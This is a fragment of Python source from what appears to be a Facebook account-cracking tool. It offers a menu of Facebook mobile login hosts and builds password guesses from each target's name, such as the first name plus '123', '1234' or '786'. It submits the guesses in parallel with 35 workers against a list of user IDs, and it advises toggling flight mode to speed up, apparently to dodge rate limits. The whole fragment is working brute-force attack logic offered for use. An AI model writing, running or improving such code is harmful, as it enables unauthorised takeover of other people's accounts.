        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            os.system("clear")
            print(logo)
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            os.system ("clear")
            print(logo)
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            os.system ("clear")
            print(logo)
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
            os.system ("clear")

    def kombinasi_pw(self,url):
    	
        print('----------------------------------------')
        print('\x1b[1;97m [1] Name  Single Paass \x1b[1;92m{Fast} ')
        print('\x1b[1;97m [2] Name  Duble Paass  \x1b[1;92m{Normal}')
        print('\x1b[1;97m [3] Name Three Paass \x1b[1;91m{Slow} ')
        print('\x1b[1;97m----------------------------------------')
        pw = input(f"\x1b[1;97m [+] Select Password Method : ")
        os.system ('clear')
        print(logo)
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
            os.system ("clear")
        elif pw in["1","01"]:
            print('\x1b[1;97m--------------------------------------')
            print('\x1b[1;91m[+] Use Flight Mode for Speed Up')
            print('\x1b[1;97m--------------------------------------')
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                       else:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
            
        elif pw in["2","02"]:
            print('\x1b[1;97m--------------------------------------')
            print('\x1b[1;91m[+] Use Flight Mode for Speed Up')
            print('\x1b[1;97m--------------------------------------')
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
                       kirim.submit(self.__metode1__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
        elif pw in["3","03"]:
            print('\x1b[1;97m--------------------------------------')
            print('\x1b[1;91m[+] Use Flight Mode for Speed Up')
            print('\x1b[1;97m--------------------------------------')
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
if __name__ == '__main__':
    file()
